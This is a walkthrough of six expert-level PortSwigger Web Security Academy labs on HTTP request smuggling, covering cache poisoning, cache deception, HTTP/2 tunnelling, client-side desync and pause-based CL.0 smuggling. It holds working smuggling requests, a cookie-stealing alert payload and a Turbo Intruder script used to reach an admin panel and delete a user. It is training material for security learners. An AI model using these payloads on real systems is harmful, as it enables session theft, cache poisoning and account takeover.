## Labs Covered

This write-up focuses on the following **EXPERT-level labs** from the PortSwigger Web Security Academy related to **HTTP Request Smuggling**:

**Exploiting HTTP request smuggling to perform web cache poisoning**  
This lab demonstrates how request smuggling can be used to poison cache entries, causing the cache to serve malicious responses to other users.

**Exploiting HTTP request smuggling to perform web cache deception**  
This lab shows how request smuggling can be leveraged to trigger web cache deception attacks, exposing sensitive resources to unintended caching.

**Bypassing access controls via HTTP/2 request tunnelling**  
This lab demonstrates how HTTP/2 tunneling can be abused to bypass access controls using request smuggling techniques.

**Web cache poisoning via HTTP/2 request tunnelling**  
This lab shows how attackers can combine HTTP/2 tunneling with cache poisoning to inject malicious responses into cached content.

**Client-side desync**  
This lab covers client-side desynchronization attacks that occur when inconsistencies between client and server request parsing lead to vulnerabilities.

**Server-side pause-based request smuggling**  
This lab demonstrates advanced request smuggling using deliberate pauses to manipulate server request parsing behavior.

---

### LAB 16 - Exploiting HTTP request smuggling to perform web cache poisoning

### Lab Description

<img width="849" height="818" alt="image" src="https://github.com/user-attachments/assets/b40a0405-6efc-4f45-b956-4e248bb86685" />

### Solution

Access the lab and lookig at the post **5** we can see that next post link which will **redirect** us to next post of **website**

<img width="1441" height="652" alt="image" src="https://github.com/user-attachments/assets/187056b0-3dbd-4931-8e6d-77ad89fa7010" />

Sending the red mark request to repeater.


<img width="1570" height="913" alt="image" src="https://github.com/user-attachments/assets/b0ecec47-3f43-474b-85c0-7aaf7324d19a" />

We can  see that `/post/next?postId=5`  post id is appended to url

<img width="1910" height="703" alt="image" src="https://github.com/user-attachments/assets/41d38651-6f00-41aa-85e2-5b0dbbb32203" />

Observe that you can use this request to make the next request to the website get redirected to **/post** on a host of your choice.

Payload:
```http

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
<img width="1875" height="752" alt="image" src="https://github.com/user-attachments/assets/947d8c9e-ffd8-4b6f-9cd8-f8aa71eb686a" />

Go to your exploit server, and create a text/javascript file at **/post** with the contents:
**alert(document.cookie)**

<img width="1284" height="729" alt="image" src="https://github.com/user-attachments/assets/d72f3d1b-b37e-41b4-9884-8d96107bfc0d" />

Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:


<img width="1916" height="821" alt="image" src="https://github.com/user-attachments/assets/ee5e1128-c044-47e0-9b2d-444ecd1407db" />

Then fetch `/resources/js/tracking.js` by sending the following request:this will get smuggled request from above request and give it to the below request which will generate  alert
Confirm that the cache has been poisoned by repeating the request to **tracking.js** several times and confirming that you receive the redirect every time.

If the attack has succeeded, the response to the request should be a redirect to your exploit server.

<img width="1920" height="668" alt="image" src="https://github.com/user-attachments/assets/93d27ee3-80aa-4ca7-9e3f-99af007cf147" />


When succesfully cache is poisoned reload the website and alert will be generated and lab is solved

<img width="1716" height="389" alt="image" src="https://github.com/user-attachments/assets/2b8b7dc6-c02d-43eb-9310-6c0c9aa94772" />


As we can see when alert is generated lab is solved

<img width="1663" height="336" alt="image" src="https://github.com/user-attachments/assets/7c96f45e-049c-450b-a9b2-a29eaa9442b8" />

---

### LAB 17 - Exploiting HTTP request smuggling to perform web cache deception

### Lab Description

<img width="876" height="877" alt="image" src="https://github.com/user-attachments/assets/86cdcb21-74ca-4e0f-93e8-15c3295422c6" />

### Solution
In http history Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the GET request to / and send that to repeater.

Changing request to **Post** and adding body postid=6 and changing method to **http/1.1** to know that request smuggling is possible in the request  or not

<img width="1892" height="662" alt="image" src="https://github.com/user-attachments/assets/8b3a5ac5-a53b-4ce1-8941-0d7209320809" />

**First, we need to determine which type of HTTP request smuggling. Like CL.TE (Front-end uses Content-Length header, back-end uses Transfer-Encoding header) or TE.CL (Front-end uses Transfer-Encoding header, back-end uses Content-Length header).
So we have identfied it been using CL.TE**:

Attack request:

```http

POST/HTTP/1.1Host:0a7b0027039cfac0c0ef869700c10027.web-security-academy.net
Content-Type:application/x-www-form-urlencoded
Content-Length:49
Transfer-Encoding:chunked

0
GET /404pls HTTP/1.1
X-Foo: x

```

I  have used same tab for attack and to identified you must used two tab one for attack and one for normal request to identified smuggling
As you can see, our second time request’s response returns a 404 status code, which means the web application is vulnerable to CL.TE HTTP request smuggling.

<img width="1913" height="817" alt="image" src="https://github.com/user-attachments/assets/2eb62226-a601-4e57-a10c-388be4f1905b" />

As you can see, both `/resources/js/tracking.js` and `/resources/images/blog.svg` has implemented web cache.
That being said, we can try to poison those cache later.

`/resources/js/tracking.js`

<img width="1873" height="664" alt="image" src="https://github.com/user-attachments/assets/26b4a8b7-9600-4d23-bfea-feb726454aa2" />

`resources/images/blog.svg `

<img width="1733" height="709" alt="image" src="https://github.com/user-attachments/assets/80e9f41c-d7fd-4dbf-a540-b90be23c0351" />


Login as user wiener:

<img width="1549" height="609" alt="image" src="https://github.com/user-attachments/assets/70af6040-be94-4b8c-bbbf-ca00dcad6f39" />

After we logged in, we can view our API key.

<img width="1559" height="657" alt="image" src="https://github.com/user-attachments/assets/70d949a4-daf2-43fb-8d2a-ebc651511714" />

Armed with above information, we can try to leverage HTTP request smuggling to perform web cache deception in order to view victim’s API key!

To do so, we can first smuggle a request that returns some sensitive user-specific content:

```http

POST/HTTP/1.1Host:0a7b0027039cfac0c0ef869700c10027.web-security-academy.net
Content-Type:application/x-www-form-urlencoded
Content-Length:39
Transfer-Encoding:chunked

0
GET /my-account HTTP/1.1
X-Foo: x

```

<img width="1910" height="761" alt="image" src="https://github.com/user-attachments/assets/bcf15d4f-903c-4b08-82f1-e872098341ca" />


The next request from another user that is forwarded to the back-end server will be appended to the smuggled request, including session cookies and other headers. For example:

In our case the cache request was `/resources/js/tracking.js`

<img width="998" height="179" alt="image" src="https://github.com/user-attachments/assets/f65ecd34-f2d7-4040-b312-1ae4a676b7c5" />

We can then visits the static URL and receives the sensitive content that is returned from the cache.
An important caveat here is that we doesn’t know the URL against which the sensitive content will be cached, 
since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect.

We have use both **blog.svg** and **tracking.js** but we get account info of admin from **tracking.js**.

<img width="1893" height="753" alt="image" src="https://github.com/user-attachments/assets/0b5fc78b-b0d9-47dc-9b29-39bf603bb7a8" />

We found administrator’s API key in **/resources/js/tracking.js**
Let’s submit that! AND LAB IS solved

<img width="1904" height="695" alt="image" src="https://github.com/user-attachments/assets/6b4abc9e-5526-4ca3-ba5d-bf1216b3dcf4" />

---

### LAB 18 - Bypassing access controls via HTTP/2 request tunnelling

### Lab Description

<img width="879" height="530" alt="image" src="https://github.com/user-attachments/assets/acc546ab-79e6-467c-a49c-884d243a0e16" />

### Solution

In this Lab, the Front-End downgrades **HTTP/2** requests and fails to properly sanitize incoming headers. To solve the lab, we are required to compromise the admin and delete the user Carlos.
**Admittedly,** i found this type of vulnerability a bit difficult to detect and defend. More so, this kind of vulnerability can be highly impactful if you come across it in a real pentest/bug-bounty.


The Approach
First we begin with recon. Observe that the application has a search feature that is reflected client side and a comment section<img width="1491" height="364" alt="image" src="https://github.com/user-attachments/assets/64652ebe-9ff3-48a2-8f6a-c28843bc9ab8" />

<img width="1382" height="367" alt="image" src="https://github.com/user-attachments/assets/8d633e0d-4662-4200-ae3e-1b28a50a5f0f" />


Proxy all the request to burp.

Take note of the content-length as this will come in handy during the last bits of the lab.**(ESPECIALLY SEARCH)**

<img width="1920" height="316" alt="image" src="https://github.com/user-attachments/assets/36b680ee-f26b-4573-9a93-cedaa3af60e6" />

To prove that this vulnerability exists, we will try to inject headers with CRLF on the root of the application while keeping the request to HTTP /2 and point it to a host header that does not exist **(say test.com)**.

<img width="570" height="809" alt="image" src="https://github.com/user-attachments/assets/02eef2ff-2219-4e55-8615-c536e4bda320" />

<img width="611" height="422" alt="image" src="https://github.com/user-attachments/assets/50387aa4-4295-4dbf-894b-6344ed89bc16" />

We get a timeout connecting to **test.com**.
With that in mind, we need to find an endpoint that might leak internal headers. In this case, i found the search engine functionality to be the best bet.

<img width="923" height="355" alt="image" src="https://github.com/user-attachments/assets/02c56675-3848-4a6a-99ad-a30d8f0970bf" />


Change the request method to post.


<img width="846" height="395" alt="image" src="https://github.com/user-attachments/assets/1c21c6a2-2e4d-4bf0-bfe9-58e945238a41" />

Remove the Content-Length and the search=hacker as the front-end will ignore the cl and as for the search parameter we will introduce it in the inspector tab.

<img width="1016" height="876" alt="image" src="https://github.com/user-attachments/assets/149dd2d1-f757-4e15-b7da-4e4cca9fa8a5" />

<img width="1752" height="754" alt="image" src="https://github.com/user-attachments/assets/bed20d37-13be-4e63-9f5a-fa49b72af144" />

We get the cookie value revealed in the response, this means that we can reveal more headers if we increase the value of the content-length.

Setting the Content-Length to 140, we get more internal headers revealed.

<img width="1518" height="732" alt="image" src="https://github.com/user-attachments/assets/a23235b2-dd75-4561-8eaf-e718aeaeef64" />


We can use these internal headers to login as admin.

<img width="712" height="126" alt="image" src="https://github.com/user-attachments/assets/bc1faa4a-550c-4b9c-a2cc-b03becf2dce0" />

The Exploit

<img width="1514" height="611" alt="image" src="https://github.com/user-attachments/assets/19da8d2f-e22d-45e6-ad2a-4a686ac9ecdb" />


We try accessing the admin panel using the internal headers we retrieved as shown above. Notice some **alterations** i made.


<img width="722" height="132" alt="image" src="https://github.com/user-attachments/assets/0399b611-2a1a-47ca-90f6-585142cbc351" />

1. X-SSL-VERIFIED: means that we are verified,unlike the 0 which was previously used.
2 X-SSL-CLIENT-CN: stands for Common Name. in this instance the name should be administrator.

<img width="814" height="350" alt="image" src="https://github.com/user-attachments/assets/234c0907-bd24-4d8f-b796-e0527ea7efa2" />

We get a response for the front page and not that of the admin page.
What happens if we change the request method from **GET to POST,PUT,HEAD.**
Using a HEAD request to the home page of the application we receive a very juicy error message.


<img width="1892" height="803" alt="image" src="https://github.com/user-attachments/assets/c31b3594-f377-4c4a-bb4a-506120ed736e" />

“Server Error: Received only 3608 of expected 8760 bytes of data”
This means, the path **/ renders** 8760 but the server only received 3608 bytes of data.
We can work around this by identifying a path with 3608 bytes or less.
We try path **/admin**

<img width="1754" height="417" alt="image" src="https://github.com/user-attachments/assets/cf10e514-acc0-41b8-a5af-c36eb8a27125" />

<img width="798" height="588" alt="image" src="https://github.com/user-attachments/assets/7cfb6333-f988-423d-805c-11933c7b6c69" />

We still do not get enough response for the admin. This is because the content-length for the admin path is still too small.

<img width="970" height="85" alt="image" src="https://github.com/user-attachments/assets/8b888793-dd82-43f0-8399-4cb95366c6ed" />

We need to identify a path with more bytes than **2790** yet less than 3608.
If you recall from the first recon, the **/?search=hacker** had **3406 bytes**, that may work fine.

<img width="1562" height="394" alt="image" src="https://github.com/user-attachments/assets/c65edad8-d54f-475e-b0d3-b3fdbb5c94b0" />

<img width="646" height="180" alt="image" src="https://github.com/user-attachments/assets/a02d3cea-605d-4472-8d09-d5ad6378d078" />

<img width="803" height="806" alt="image" src="https://github.com/user-attachments/assets/0f82f17f-8543-4579-803a-a055646cfc8c" />

We get the admin panel.
With little efforts,we can now delete the user carlos.

<img width="685" height="354" alt="image" src="https://github.com/user-attachments/assets/31283ba8-46dd-4ad4-b7b4-34989b4ea99d" />

Sending above requet will solved the lab

<img width="1664" height="539" alt="image" src="https://github.com/user-attachments/assets/62a98e25-52cf-4602-b170-1c11f499edd3" />

---

### LAB 19 - Web cache poisoning via HTTP/2 request tunnelling

### Lab Description
<img width="877" height="426" alt="image" src="https://github.com/user-attachments/assets/194fb1db-7762-45ee-a37e-12a0a60089b2" />

### Solution

Here, we will work around on how we can poison the cache in such a way that when the victim visits the home page, their browser executes `alert(1)`.

A victim user will visit the home page every 15 seconds.

In this scenario, the front end does not reuse the connection to the back-end server, so it isn’t vulnerable to a classic request smuggling attack. The only way around it is through a **request tunneling attack**.

This vulnerability is rampant in many web applications I have come across.

### The Approach

We will start by confirming that the request smuggling attack works by smuggling a request to an end-point that does not exist.

We can do this as follows:

<img width="1608" height="614" alt="image" src="https://github.com/user-attachments/assets/503c4a8f-e97b-4135-9271-14e63ea1b816" />


We get a 404 not found, and this is POC that vulnerability exists.

### Exploitation

To exploit this, we can add a cache buster parameter that we can use only us to confirm that the smuggled request is working. if it works we can remove the cache parameter to smuggle the request to the actual front page.

I will demonstrate all these with screenshots.

<img width="1830" height="718" alt="image" src="https://github.com/user-attachments/assets/38f335fb-bea3-4534-a236-5618e0d44474" />

As you can see, we introduced an arbitrary path `/?cachebuster=1` HTTP/1.1 and smuggled a **GET** request to `/post?postId=9` We expected to view the content of the post but instead we receive the contents of the home page.
This is because the web app has a blind request-smuggling vulnerability since the front end is reading the back-end result following what the content-length telling it, and that’s the home page.
However we can turn this attack to a non-blind attack by changing the request method from **GET** to **Head**. This works because a **HEAD** request makes the front-end to read from the headers and not the content-length.

<img width="1340" height="539" alt="image" src="https://github.com/user-attachments/assets/11648d79-1f84-4d03-8502-b5d626093bb7" />

<img width="1587" height="468" alt="image" src="https://github.com/user-attachments/assets/bf729593-a6dd-42c0-8fd1-1c2ab921be64" />

Notice that we now get the request headers for our smuggled request.
However, there is a catch to this that you should understand. If you send a request with a **lesser content length** than that of the home page, you get a **timeout**.

<img width="1465" height="513" alt="image" src="https://github.com/user-attachments/assets/4641a9e2-ad79-411b-b819-133635aaf719" />


<img width="611" height="223" alt="image" src="https://github.com/user-attachments/assets/2825f0dc-8964-4fcf-8deb-43436e70979f" />


The web server expected **8350 bytes** of character but instead got **11 bytes** only.
Now we need to identify a sink that reflects user input in the response and and inject our JavaScript.



<img width="1067" height="335" alt="image" src="https://github.com/user-attachments/assets/256ede80-dc91-4135-a9d7-f56224b096b4" />


To achieve this, find a path to a resource and delete a couple of directories until you find a **302 redirect** to the specified resource path which we can inject our JavaScript payload.


<img width="1284" height="365" alt="image" src="https://github.com/user-attachments/assets/8f699a91-c8b2-4232-8bb3-523d14a50897" />


And it works!!!

<img width="1300" height="388" alt="image" src="https://github.com/user-attachments/assets/88545e14-4166-43cd-b29e-971642be7f81" />

We encounter the same problem as before. The bytes expected from the smuggled request were lesser than that of the home page. So we need to add more bytes to it. We need to print at least **8800 A** characters.
We do so as follows.


<img width="1908" height="809" alt="image" src="https://github.com/user-attachments/assets/357131a0-a77f-4dbe-a658-e73483c527db" />



<img width="1610" height="589" alt="image" src="https://github.com/user-attachments/assets/19a3c378-2bcb-4344-8f01-e93d83d9bcd1" />



We get the response as expected.

<img width="475" height="639" alt="image" src="https://github.com/user-attachments/assets/9bc7ac30-9ffb-4a8b-8e41-cb11ee47b787" />

To poison the home page, we need to get rid of the `?cachebuster=2`. simply **leave the path blank**.


<img width="1210" height="343" alt="image" src="https://github.com/user-attachments/assets/9fd74c62-26d4-4ff4-9a61-7eaade872d86" />

And lab is solved

<img width="1622" height="349" alt="image" src="https://github.com/user-attachments/assets/7883d098-e8a7-45f6-99df-4a3f133b1288" />

---

### LAB 20 - Client-side desync

### Lab Description

<img width="836" height="673" alt="image" src="https://github.com/user-attachments/assets/03d5cc6a-07d1-409d-b12d-b94d2352b38e" />


# Overview: Client-Side Desync (CSD) Attacks

A **Client-Side Desync (CSD)** attack occurs when a victim's **browser** becomes desynchronized with the target **web server**, as opposed to traditional request smuggling which involves desynchronization between **front-end and back-end servers**.


<img width="1751" height="420" alt="image" src="https://github.com/user-attachments/assets/83b16006-8129-4feb-bbb1-de86ee2b11e2" />


### How It Works

Some web servers respond to `POST` requests **without reading the full body**. If the browser reuses the same connection for additional requests, it can result in a client-side desync vulnerability.

#### Attack Flow:

1. The victim visits a malicious web page containing attacker-controlled JavaScript.
2. The JavaScript sends a crafted `POST` request to the vulnerable site, leaving part of the request (the "prefix") in the socket buffer.
3. The server responds to the request but leaves the prefix unprocessed in the TCP/TLS socket.
4. The browser sends a second request using the same connection.
5. This follow-up request gets appended to the original malicious prefix, triggering unintended behavior on the server.

Unlike traditional request smuggling, CSD attacks **do not require multiple servers**. Even a **single-server** architecture can be vulnerable.

---

### Important Notes

- **CSD requires HTTP/1.1.** Most browsers prefer HTTP/2, so the attack will **only work** if the server **does not support HTTP/2**.
- A possible exception is when the victim accesses the website through a **proxy** that only supports HTTP/1.1.

---

### Testing for Client-Side Desync Vulnerabilities

To successfully identify and exploit CSD, follow this structured workflow:

1. **Probe** for desync vectors using Burp Suite.
2. **Confirm** the desync vector behavior in Burp.
3. **Build a PoC (Proof of Concept)** to test the desync in a real browser.
4. **Identify a gadget** – a response or behavior that can be manipulated for exploitation.
5. **Construct a working exploit** in Burp.
6. **Replicate** the exploit in the browser.

Both **Burp Scanner** and the **HTTP Request Smuggler** extension can help automate some of these tasks. However, understanding the manual process is crucial for mastering CSD attack techniques.

### Solution

In the request to the home page, add a content-length value greater than the len of the body, we see that the request is still normal and returns **302** to/en

<img width="941" height="194" alt="image" src="https://github.com/user-attachments/assets/db7a1e3b-a16c-4912-8b59-f9f71a9b9e96" />

Try smuggling like this:

<img width="890" height="394" alt="image" src="https://github.com/user-attachments/assets/f42118ba-43f6-4b9c-a425-e627e59377dd" />

Check comment at **postId 9 -> successfully** "captured" another user's request


<img width="860" height="202" alt="image" src="https://github.com/user-attachments/assets/894de1e3-0473-4fa9-ad50-4878a80d547e" />

Payload exploits client desync as follows

<img width="896" height="342" alt="image" src="https://github.com/user-attachments/assets/f6cd83b6-e619-4b4a-8460-c7c0ca0693b0" />

**Note:** "cors" to trigger cors error block follow redirect


<img width="877" height="318" alt="image" src="https://github.com/user-attachments/assets/b3ce0289-5ded-454c-8050-65ba72c40237" />


<img width="403" height="81" alt="image" src="https://github.com/user-attachments/assets/6a7b5792-3b29-4e57-aec2-b3aff19054e7" />



Set cookies again and solve the lab problem


<img width="758" height="172" alt="image" src="https://github.com/user-attachments/assets/576a63a6-7703-4664-bea1-06992d7c8bce" />

Let's take a look at the redirect mentioned above, try setting it up with mode. no-corsWe see that the "caught" request will look like this:


<img width="850" height="300" alt="image" src="https://github.com/user-attachments/assets/7a9bff69-9c14-4ad1-a899-8b9815d69407" />


Try pretending to be a victim and test, we have the Network tab as follows:

<img width="996" height="57" alt="image" src="https://github.com/user-attachments/assets/d0ffa026-a71f-4b78-b6e3-341799b2ff89" />


---

### LAB 21 - Server-side pause-based request smuggling

### Lab Description

<img width="870" height="548" alt="image" src="https://github.com/user-attachments/assets/27deac1c-e90c-4647-8069-21a8354e1320" />

### Solution

Exploring the app and then sending get request to repeate ,We can also see resources  request in red highlight.


<img width="1909" height="636" alt="image" src="https://github.com/user-attachments/assets/548daf28-7468-4523-82ec-f5019667c837" />

### Identify a desync vector
	In Burp, notice from the Server response header that the lab is using **Apache 2.4.52**. This version of Apache is potentially vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects.


<img width="1331" height="801" alt="image" src="https://github.com/user-attachments/assets/5cd0d314-ab9c-46dd-9da4-936bd48ecaea" />


In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, **GET /resources**. Observe that you are redirected to **/resources/**.


<img width="1338" height="861" alt="image" src="https://github.com/user-attachments/assets/ca0af4a6-d00c-42d3-93fa-89bd8bab087f" />

Right-click the request and **select Extensions > Turbo Intruder > Send to Turbo Intruder**.


<img width="1920" height="854" alt="image" src="https://github.com/user-attachments/assets/37f3dae9-cdad-4c9a-bb64-b07315e04c55" />

In Turbo Intruder, convert the request to a POST request (right-click and select **Change request method**).


<img width="1920" height="557" alt="image" src="https://github.com/user-attachments/assets/6f3716ba-1dd3-48c2-9e6e-52c499e3180c" />


### HTTP Request Smuggling - Access Admin Panel via Keep-Alive Header

#### Steps:

1. **Change the Connection header to `keep-alive`.**

2. **Add a complete `GET /admin` request to the body of the main request.**

Example request:
```http
POST /resources HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/ HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
````

3. **In the Python editor panel**, enter the following script to queue the requests with a 61-second pause after the headers:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Note:

At the end of the smuggled request, **ensure you include two `\r\n` line breaks**. Without these trailing CRLF characters, the server will not correctly interpret the smuggled request and may not grant access to the admin panel.


<img width="1896" height="863" alt="image" src="https://github.com/user-attachments/assets/3d713df9-2d0f-45a3-949b-d76f8f7596a3" />

Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table:
	○ The first entry is the **POST /resources** request, which triggered a redirect to **/resources/** as normal.
  ○  The second entry is a response to the **GET /admin/** request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability.


  <img width="1913" height="977" alt="image" src="https://github.com/user-attachments/assets/1af59600-902e-4dab-a5b8-a00b3ee05649" />

In Turbo Intruder, go back to the attack configuration screen. In your smuggled request, change the Host header to localhost and relaunch the attack.
**After 61 seconds**, notice that you have now successfully accessed the admin panel.

<img width="1903" height="861" alt="image" src="https://github.com/user-attachments/assets/8c08777f-0772-45cf-b651-8e373966263e" />


Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:

 • The action attribute (/admin/delete).
	• The name of the input (username).
	• The csrf token

<img width="1868" height="904" alt="image" src="https://github.com/user-attachments/assets/e0e85ec0-f6f7-49b2-b10c-87a7e482f8ea" />

We also copy csrf and cookie

<img width="1920" height="1029" alt="image" src="https://github.com/user-attachments/assets/f5d380f8-a5e2-4a91-abaf-35a0ed2c938f" />

We render response to know how it look like we can see that it is taking name of user to delete.

<img width="1890" height="880" alt="image" src="https://github.com/user-attachments/assets/a77ee602-6b52-442f-a79a-ab17e76fdb96" />


Go back to the attack configuration screen. Use these details to replicate the request that would be issued when submitting the form. The result should look something like this:
```http

POST /resources HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```

To prevent Turbo Intruder from pausing after both occurrences of \r\n\r\n in the request, update the pauseMarker argument so that it only matches the end of the first set of headers, for example:
```
pauseMarker=['Content-Length: CORRECT\r\n\r\n']
```

Launch the attack.

<img width="1653" height="921" alt="image" src="https://github.com/user-attachments/assets/af83b7a5-1aca-431b-bfd4-e79c3f67a1df" />

After 61 seconds, the lab is solved.


<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/7988d490-37a9-4c99-bd6a-c5b01abc9f55" />

lab is solved.

<img width="1761" height="557" alt="image" src="https://github.com/user-attachments/assets/13e4df40-dc55-4cfd-a1ce-1b839a17ec0f" />

---
